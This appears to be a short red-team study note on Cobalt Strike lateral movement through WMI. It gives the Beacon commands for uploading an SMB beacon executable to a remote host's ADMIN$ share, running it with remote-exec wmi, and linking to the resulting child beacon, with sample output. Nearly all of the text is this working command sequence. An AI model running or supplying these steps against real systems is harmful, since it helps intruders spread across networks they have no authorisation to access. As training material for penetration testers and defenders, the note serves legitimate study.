# [[WMI (Windows Management Instrumentation)]]

## Description:  
For Lateral Movement in Cobalt Strike

TheÂ `remote-exec`Â method uses WMI's "process call create" to execute any command we specify on the target. The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.

Generate an x64 Windows EXE for the SMB listener, upload it to the target byÂ `cd`'ing to the desired UNC path and then use theÂ `upload`Â command.

```
beacon> cd \\srv-1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe
Started process 536 on srv-1
```

The process is now running on SRV-1 so now we need to connect to it.
```
beacon> link srv-1
[+] established link to child beacon: 10.10.17.25
```
